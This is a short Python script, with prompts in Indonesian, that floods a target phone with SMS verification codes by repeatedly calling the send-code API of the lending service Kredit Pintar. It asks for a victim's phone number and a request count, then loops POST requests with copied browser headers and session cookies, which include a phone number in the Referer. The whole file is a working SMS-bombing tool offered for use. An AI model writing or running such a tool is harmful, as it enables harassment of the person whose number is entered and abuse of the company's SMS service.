import requests

url = "https://h.kreditpintar.com/api/auth/send-code?channel=OFFICIAL2021&lang=id"

headers = {
    "Host": "h.kreditpintar.com",
    "Connection": "keep-alive",
    "Content-Length": "46",
    "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
    "x-adv-market-channel": "OfficialWebsite",
    "x-user-agent": "Pintar-ID-Cash (WebAndroid;;;id) uuid/51934617-5d9c-4e84-a916-c617b316eeae version/0.1.0",
    "x-app-version": "APPVERSION_NAME(9999)",
    "Accept-Language": "id",
    "sec-ch-ua-mobile": "?1",
    "x-adv-uuid": "51934617-5d9c-4e84-a916-c617b316eeae",
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Content-Type": "application/json",
    "Accept": "application/json, text/plain, */*",
    "sentry-trace": "60873b4723bc4a4f85306bbe54cb67e1-8b65032e0f007de8-0",
    "x-os-type": "WEB",
    "sec-ch-ua-platform": '"Android"',
    "Origin": "https://h.kreditpintar.com",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://h.kreditpintar.com/OFFICIAL2021/code-step?m=08985194578",
    "Accept-Encoding": "gzip, deflate, br",
    "Cookie": "_kp_webAdvertisingId=2afdda49-06c6-4bb1-84a4-261addee0ba5; _gid=GA1.2.1526627582.1695249953; _gac_UA-135444739-2=1.1695251822.CjwKCAjwsKqoBhBPEiwALrrqiEUJ9JWQ99WzD4L-eGgTiVXlxavk5rF5cMLCxLwHN5a7DJRgRIa2FRoCEPcQAvD_BwE; _gat_gtag_UA_135444739_2=1; _ga_2SLM50XVZK=GS1.1.1695251822.2.0.1695251822.60.0.0; _ga=GA1.1.1006141298.1695249952; _fbp=fb.1.1695251832687.1878906182; _tt_enable_cookie=1; _ttp=louGqiBfHXQxdpScau3GZkk2wHW"
}

payload = {
    "mobileNumber": "",  # Nomor telepon akan dimasukkan di sini
    "type": "SMS"
}

phone_number = input("Masukkan nomor telepon: ")
num_requests = int(input("Masukkan jumlah permintaan: "))

payload["mobileNumber"] = phone_number

for _ in range(num_requests):
    response = requests.post(url, headers=headers, json=payload)

    if response.ok:
        print("Permintaan berhasil!")
        try:
            response_json = response.json()
            # Lakukan sesuatu dengan respons JSON jika diperlukan
        except Exception as e:
            print("Terjadi kesalahan dalam mengurai respons JSON:", str(e))
    else:
        print("Permintaan gagal dengan kode status:", response.status_code)

